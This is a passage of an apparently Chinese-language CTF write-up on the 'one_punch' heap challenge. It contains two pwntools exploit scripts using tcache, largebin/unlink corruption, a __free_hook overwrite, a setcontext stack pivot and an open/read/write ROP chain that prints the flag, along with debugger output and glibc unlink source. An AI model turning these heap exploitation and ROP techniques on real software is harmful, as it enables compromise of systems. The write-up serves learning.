class="string">": "</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b"\x00"</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap : "</span> + hex(heap))</span><br><span class="line">info(<span class="string">"libc : "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#overlapping</span></span><br><span class="line"></span><br><span class="line">length = <span class="number">0xe0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span> * length) <span class="comment">#add-&gt;chunk2's site</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span> * <span class="number">0x80</span>)  <span class="comment">#add-&gt;chunk2-&gt;next</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b'\x00'</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>)) <span class="comment">#-&gt;chunk1</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b'\x00'</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b'\x00'</span> * length + p64(<span class="number">0</span>) + p64(<span class="number">0x3a1</span>))</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#三个chunk使得0xxxxxxxx148位置的被改写成0x301</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">1</span>, <span class="string">'b'</span> * <span class="number">0x3a8</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b'\x00'</span> * length + p64(<span class="number">0x300</span>) + p64(<span class="number">0x570</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)+ p64(heap + <span class="number">0x40</span>) + p64(heap + <span class="number">0x40</span>)) </span><br><span class="line">dele(<span class="number">0</span>) <span class="comment">#--&gt;0x140 into unsorted bin  (storged the tcache 0x220 size chunk_addr)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="string">b'c'</span> * <span class="number">0x100</span> + p64(libc.symbols[<span class="string">'__free_hook'</span>]+libc_base)) <span class="comment">#0x10-0x400 save the tcache_addr ##  free chunk -&gt;into 0x150</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">cmd(str(<span class="number">50056</span>)) <span class="comment">#malloc 0x217 -&gt;tcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; </span></span><br><span class="line">p.send(p64(libc_base+<span class="number">0x000000000012be97</span>))  <span class="comment">#malloc  write tcache bin --&gt;free_hook</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7f903816ae35 &lt;setcontext+53&gt;:mov    rsp,QWORD PTR [rdx+0xa0]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae3c &lt;setcontext+60&gt;:mov    rbx,QWORD PTR [rdx+0x80]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae43 &lt;setcontext+67&gt;:mov    rbp,QWORD PTR [rdx+0x78]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae47 &lt;setcontext+71&gt;:mov    r12,QWORD PTR [rdx+0x48]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae4b &lt;setcontext+75&gt;:mov    r13,QWORD PTR [rdx+0x50]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae4f &lt;setcontext+79&gt;:mov    r14,QWORD PTR [rdx+0x58]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae53 &lt;setcontext+83&gt;:mov    r15,QWORD PTR [rdx+0x60]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae57 &lt;setcontext+87&gt;:mov    rcx,QWORD PTR [rdx+0xa8]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae5e &lt;setcontext+94&gt;:push   rcx</span></span><br><span class="line"><span class="comment"># 0x7f903816ae5f &lt;setcontext+95&gt;:mov    rsi,QWORD PTR [rdx+0x70]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae63 &lt;setcontext+99&gt;:mov    rdi,QWORD PTR [rdx+0x68]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae67 &lt;setcontext+103&gt;:mov    rcx,QWORD PTR [rdx+0x98]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae6e &lt;setcontext+110&gt;:mov    r8,QWORD PTR [rdx+0x28]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae72 &lt;setcontext+114&gt;:mov    r9,QWORD PTR [rdx+0x30]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae76 &lt;setcontext+118&gt;:mov    rdx,QWORD PTR [rdx+0x88]</span></span><br><span class="line"><span class="comment"># 0x7f903816ae7d &lt;setcontext+125&gt;:xor    eax,eax</span></span><br><span class="line"><span class="comment"># 0x7f903816ae7f &lt;setcontext+127&gt;:ret    </span></span><br><span class="line"><span class="comment"># 00000000000026542: pop rdi; ret;</span></span><br><span class="line"><span class="comment"># 0x000000000012bdc9: pop rdx; pop rsi; ret;</span></span><br><span class="line"><span class="comment"># 0x0000000000047cf8: pop rax; ret;</span></span><br><span class="line"><span class="comment"># 0x00000000000cf6c5: syscall; ret;x</span></span><br><span class="line">p_rdi = <span class="number">0x0000000000026542</span>+libc_base</span><br><span class="line">p_rdx_rsi = <span class="number">0x000000000012bdc9</span>+libc_base</span><br><span class="line">p_rax = <span class="number">0x0000000000047cf8</span>+libc_base</span><br><span class="line">syscall_ret = <span class="number">0x00000000000cf6c5</span>+libc_base</span><br><span class="line">payload = p64(libc.symbols[<span class="string">"setcontext"</span>]+libc_base+<span class="number">53</span>)+p64(heap+<span class="number">0x1ac0</span>)</span><br><span class="line">payload += <span class="string">b'./flag.txt'</span>+<span class="string">b'\x00'</span>*<span class="number">6</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">9</span><span class="comment">#offset 0x68</span></span><br><span class="line">payload += p64(heap+<span class="number">0x1ad0</span>)<span class="comment">#rdi</span></span><br><span class="line">payload += p64(<span class="number">0</span>)<span class="comment">#rsi</span></span><br><span class="line">payload += p64(heap+<span class="number">0x2000</span>)<span class="comment">#rbp</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span><span class="comment">#rbx and rdx</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(heap+<span class="number">0x1b78</span>)<span class="comment"># rsp</span></span><br><span class="line">payload += p64(p_rax)<span class="comment">#rcx</span></span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">3</span>)+p64(p_rdx_rsi)+p64(<span class="number">0x80</span>)+p64(heap+<span class="number">0x2d00</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">1</span>)+p64(p_rax)+p64(<span class="number">1</span>)+p64(syscall_ret)</span><br><span class="line">payload += p64(p_rdi)+p64(<span class="number">0</span>)+p64(p_rax)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">main(args[<span class="string">'REMOTE'</span>])</span><br></pre></td></tr></table></figure><h5 id="疑惑"><a href="#疑惑" class="headerlink" title="疑惑"></a>疑惑</h5><p>1.为什么构造largebin的时候是在fd_nextsize &amp; bk_nextsize填入目的地址，而fd还有bk都是0？</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">─────────────────────────────────[ REGISTERS ]──────────────────────────────────</span><br><span class="line"> RAX  <span class="number">0x55bad5321350</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RBX  <span class="number">0x55bad5321040</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RCX  <span class="number">0x301</span></span><br><span class="line"> RDX  <span class="number">0x55bad5321350</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RDI  <span class="number">0x55bad5321040</span> ◂— <span class="number">0x0</span></span><br><span class="line"> RSI  <span class="number">0x0</span></span><br><span class="line"> R8   <span class="number">0x0</span></span><br><span class="line"> R9   <span class="number">0x0</span></span><br><span class="line"> R10  <span class="number">0x7f6e0102cae0</span> (_nl_C_LC_CTYPE_toupper+<span class="number">512</span>) ◂— <span class="number">0x100000000</span></span><br><span class="line"> R11  <span class="number">0x7f6e0102d3e0</span> (_nl_C_LC_CTYPE_class+<span class="number">256</span>) ◂— <span class="number">0x2000200020002</span></span><br><span class="line"> R12  <span class="number">0x7f6e01077c40</span> (main_arena) ◂— <span class="number">0x0</span></span><br><span class="line"> R13  <span class="number">0x55bad53218b0</span> ◂— <span class="number">0x616161616161</span> /* <span class="string">'aaaaaa'</span> */</span><br><span class="line"> R14  <span class="number">0x1</span></span><br><span class="line"> R15  <span class="number">0x220</span></span><br><span class="line"> RBP  <span class="number">0x870</span></span><br><span class="line"> RSP  <span class="number">0x7ffe7a82d4f0</span> ◂— <span class="number">0x50000</span></span><br><span class="line"> RIP  <span class="number">0x7f6e00f26781</span> (unlink_chunk.isra+<span class="number">33</span>) ◂— cmp    rdi, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line">───────────────────────────────────[ DISASM ]───────────────────────────────────</span><br><span class="line">   <span class="number">0x7f6e00f2676b</span> &lt;unlink_chunk.isra+<span class="number">11</span>&gt;     <span class="keyword">and</span>    rax, <span class="number">0xfffffffffffffff8</span></span><br><span class="line">   <span class="number">0x7f6e00f2676f</span> &lt;unlink_chunk.isra+<span class="number">15</span>&gt;     cmp    rax, qword ptr [rdi + rax]</span><br><span class="line">   <span class="number">0x7f6e00f26773</span> &lt;unlink_chunk.isra+<span class="number">19</span>&gt;     jne    unlink_chunk.isra+<span class="number">213</span> &lt;<span class="number">0x7f6e00f26835</span>&gt;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">   <span class="number">0x7f6e00f26779</span> &lt;unlink_chunk.isra+<span class="number">25</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x7f6e00f2677d</span> &lt;unlink_chunk.isra+<span class="number">29</span>&gt;     mov    rdx, qword ptr [rdi + <span class="number">0x18</span>]</span><br><span class="line"> ► <span class="number">0x7f6e00f26781</span> &lt;unlink_chunk.isra+<span class="number">33</span>&gt;     cmp    rdi, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x7f6e00f26785</span> &lt;unlink_chunk.isra+<span class="number">37</span>&gt;     jne    unlink_chunk.isra+<span class="number">176</span> &lt;<span class="number">0x7f6e00f26810</span>&gt;</span><br><span class="line">    ↓</span><br><span class="line">   <span class="number">0x7f6e00f26810</span> &lt;unlink_chunk.isra+<span class="number">176</span>&gt;    lea    rdi, [rip + <span class="number">0x11d1b6</span>]</span><br><span class="line">   <span class="number">0x7f6e00f26817</span> &lt;unlink_chunk.isra+<span class="number">183</span>&gt;    call   malloc_printerr &lt;<span class="number">0x7f6e00f26580</span>&gt;</span><br></pre></td></tr></table></figure><p>对比的地方是rdi和rax+0x18的位置，所以是fd_nextsize的内容要等于fake chunk</p><p>unlink:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">unlink_chunk (mstate av, mchunkptr p)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">    malloc_printerr (<span class="string">"corrupted size vs. prev_size"</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>)) <span class="comment">// 本题中，对应next chunk的fd_nextsize和bk_nextsize的位置</span></span><br><span class="line">    malloc_printerr (<span class="string">"corrupted double-linked list"</span>);</span><br><span class="line"></span><br><span class="line">  fd-&gt;bk = bk;</span><br><span class="line">  bk-&gt;fd = fd;</span><br><span class="line">  <span class="keyword">if</span> (!in_smallbin_range (chunksize_nomask (p)) &amp;&amp; p-&gt;fd_nextsize != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (p-&gt;fd_nextsize-&gt;bk_nextsize != p</span><br><span class="line">  || p-&gt;bk_nextsize-&gt;fd_nextsize != p)</span><br><span class="line">malloc_printerr (<span class="string">"corrupted double-linked list (not small)"</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (fd-&gt;fd_nextsize == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p-&gt;fd_nextsize == p)</span><br><span class="line">    fd-&gt;fd_nextsize = fd-&gt;bk_nextsize = fd;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      fd-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">      fd-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">      p-&gt;fd_nextsize-&gt;bk_nextsize = fd;</span><br><span class="line">      p-&gt;bk_nextsize-&gt;fd_nextsize = fd;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  p-&gt;fd_nextsize-&gt;bk_nextsize = p-&gt;bk_nextsize;</span><br><span class="line">  p-&gt;bk_nextsize-&gt;fd_nextsize = p-&gt;fd_nextsize;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.这个方法好像没用到真正的largebin attack，更像是unsortedbin attack?<br>好像这个方法用的是unlink，不是largebin</p><h4 id="方法二’s-exp"><a href="#方法二’s-exp" class="headerlink" title="方法二’s exp"></a>方法二’s exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># host = '52.198.120.1'</span></span><br><span class="line"><span class="comment"># port = 48763</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./one_punch'</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">"./one_punch"</span></span><br><span class="line">context.binary = binary</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">  log.success(<span class="string">"libc load success"</span>)</span><br><span class="line">  system_off = libc.symbols.system</span><br><span class="line">  log.success(<span class="string">"system_off = "</span>+hex(system_off))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">  log.failure(<span class="string">"libc not found !"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">name</span><span class="params">(index, name)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(<span class="string">"1"</span>)</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.sendline(str(index))</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.send(name)</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span><span class="params">(index,name)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(<span class="string">"2"</span>)</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.sendline(str(index))</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.send(name)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">d</span><span class="params">(index)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(<span class="string">"4"</span>)</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.sendline(str(index))</span><br><span class="line">  <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(<span class="string">"3"</span>)</span><br><span class="line">  r.recvuntil(<span class="string">": "</span>)</span><br><span class="line">  r.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span><span class="params">(data)</span>:</span></span><br><span class="line">  r.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">  r.sendline(str(<span class="number">0xc388</span>))</span><br><span class="line">  time.sleep(<span class="number">0.1</span>)</span><br><span class="line">  r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># if len(sys.argv) == 1:</span></span><br><span class="line"><span class="comment">#   r = process([binary, "0"], env=&#123;"LD_LIBRARY_PATH":"."&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#   r = remote(host ,port)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">  <span class="comment"># gdb.attach(r)</span></span><br><span class="line">  </span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  d(<span class="number">0</span>)</span><br><span class="line">  name(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  d(<span class="number">1</span>)</span><br><span class="line">  show(<span class="number">1</span>)</span><br><span class="line">  r.recvuntil(<span class="string">" name: "</span>)</span><br><span class="line">  heap = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x260</span></span><br><span class="line">  <span class="comment"># print("heap = &#123;&#125;".format(hex(heap)))</span></span><br><span class="line">  <span class="keyword">print</span> hex(heap)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">5</span>):</span><br><span class="line">    name(<span class="number">2</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">    d(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  name(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  d(<span class="number">0</span>)</span><br><span class="line">  show(<span class="number">0</span>)</span><br><span class="line">  r.recvuntil(<span class="string">" name: "</span>)</span><br><span class="line">  libc = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line">  print(<span class="string">"libc = &#123;&#125;"</span>.format(hex(libc)))</span><br><span class="line">  d(<span class="number">1</span>)</span><br><span class="line">  </span><br><span class="line">  rename(<span class="number">2</span>,p64(libc + <span class="number">0x1e4c30</span>))</span><br><span class="line"></span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"D"</span>*<span class="number">0x90</span>)</span><br><span class="line">  d(<span class="number">0</span>)</span><br><span class="line">  </span><br><span class="line"><span class="comment"># 构造largebin attack的堆块</span></span><br><span class="line"><span class="comment"># full count</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">7</span>): </span><br><span class="line">    name(<span class="number">0</span>,<span class="string">"D"</span>*<span class="number">0x80</span>)</span><br><span class="line">    d(<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">7</span>):</span><br><span class="line">    name(<span class="number">0</span>,<span class="string">"D"</span>*<span class="number">0x200</span>)</span><br><span class="line">    d(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#largebin 0x431</span></span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"D"</span>*<span class="number">0x200</span>)</span><br><span class="line">  name(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x210</span>)</span><br><span class="line">  name(<span class="number">2</span>,p64(<span class="number">0x21</span>)*(<span class="number">0x90</span>/<span class="number">8</span>))</span><br><span class="line">  rename(<span class="number">2</span>,p64(<span class="number">0x21</span>)*(<span class="number">0x90</span>/<span class="number">8</span>)) <span class="comment">#填充size</span></span><br><span class="line">  d(<span class="number">2</span>)</span><br><span class="line">  <span class="comment"># calloc从unsortedbin中取，不取tcache</span></span><br><span class="line">  name(<span class="number">2</span>,p64(<span class="number">0x21</span>)*(<span class="number">0x90</span>/<span class="number">8</span>))</span><br><span class="line">  rename(<span class="number">2</span>,p64(<span class="number">0x21</span>)*(<span class="number">0x90</span>/<span class="number">8</span>))</span><br><span class="line">  d(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">  d(<span class="number">0</span>)  <span class="comment">#unsorted bin</span></span><br><span class="line">  d(<span class="number">1</span>)  <span class="comment">#unlink </span></span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x80</span>) </span><br><span class="line">  name(<span class="number">1</span>,<span class="string">"A"</span>*<span class="number">0x80</span>) <span class="comment">#free 0x311 形成两个不一样的chunk</span></span><br><span class="line">  </span><br><span class="line">  d(<span class="number">0</span>)  <span class="comment">#chunk0  fd- &gt; 0x550</span></span><br><span class="line">  d(<span class="number">1</span>)  <span class="comment"># sum 0x431 </span></span><br><span class="line">   </span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x88</span> + p64(<span class="number">0x421</span>) + <span class="string">"D"</span>*<span class="number">0x180</span> )</span><br><span class="line">  name(<span class="number">2</span>,<span class="string">"A"</span>*<span class="number">0x200</span>) <span class="comment">#将1和0合并，calloc改成2</span></span><br><span class="line">  </span><br><span class="line">  d(<span class="number">1</span>)  <span class="comment">#0x421</span></span><br><span class="line">  d(<span class="number">2</span>)  <span class="comment">#0x211 </span></span><br><span class="line">  name(<span class="number">2</span>,<span class="string">"A"</span>*<span class="number">0x200</span>) <span class="comment">#into largebin</span></span><br><span class="line">  rename(<span class="number">0</span>,<span class="string">"A"</span>*<span class="number">0x88</span> + p64(<span class="number">0x421</span>) + p64(libc + <span class="number">0x1e5090</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(heap+<span class="number">0x10</span>) )  <span class="comment">#--&gt; chunk1   构造largebin attack 的堆块</span></span><br><span class="line">  d(<span class="number">0</span>)</span><br><span class="line">  d(<span class="number">2</span>) <span class="comment">#unlink 0x431</span></span><br><span class="line">  <span class="comment"># gdb.attach(r)</span></span><br><span class="line">  <span class="comment"># pause() </span></span><br><span class="line">  name(<span class="number">0</span>,<span class="string">"./flag.txt\x00\x00"</span> + <span class="string">"A"</span>*<span class="number">0x1f0</span>)  <span class="comment">#full the tcache size  ,0x430 write './flag.txt'  calloc之后将tcache的count填满</span></span><br><span class="line">  magic(<span class="string">"ABCDE"</span>) <span class="comment">#malloc -&gt; tcache read chunk_addr(list has 2 chunk,this is the first)</span></span><br><span class="line">   </span><br><span class="line">  add_rsp48 = libc + <span class="number">0x000000000008cfd6</span></span><br><span class="line">  pop_rdi = libc + <span class="number">0x0000000000026542</span></span><br><span class="line">  pop_rsi = libc + <span class="number">0x0000000000026f9e</span></span><br><span class="line">  pop_rdx = libc + <span 